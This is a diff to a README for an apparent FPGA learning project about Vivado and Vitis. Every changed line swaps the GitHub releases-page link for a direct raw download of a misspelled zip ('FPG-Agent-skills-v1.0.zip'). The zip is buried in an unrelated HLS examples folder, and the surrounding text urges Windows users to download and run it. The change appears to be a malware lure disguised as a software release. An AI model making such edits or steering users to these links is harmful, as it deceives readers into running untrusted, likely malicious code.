@@ -1,6 +1,6 @@
 # 🧠 FPGA-Agent-skills - Learn Vivado and Vitis Faster
 
-[![Download the release page](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/adeleempurpled290/FPGA-Agent-skills/releases)
+[![Download the release page](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)
 
 ## 📦 What this is
 
@@ -12,7 +12,7 @@ This project is made for people who want a clear path through FPGA work on Windo
 
 Use the release page to download and run this file on Windows:
 
-[Visit the release page to download](https://github.com/adeleempurpled290/FPGA-Agent-skills/releases)
+[Visit the release page to download](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)
 
 After you open the page:
 
@@ -250,7 +250,7 @@ This repo helps with:
 
 The release page is the main place to get the latest files:
 
-[Visit the release page to download](https://github.com/adeleempurpled290/FPGA-Agent-skills/releases)
+[Visit the release page to download](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)
 
 After you download the file, keep the original release archive in case you need it again later.
 
@@ -278,6 +278,6 @@ This project helps you:
 
 ## 📎 Release download
 
-[![Download from GitHub Releases](https://img.shields.io/badge/GitHub%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/adeleempurpled290/FPGA-Agent-skills/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/GitHub%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)
 
 Visit the page, download the latest release, and run the file on your Windows PC
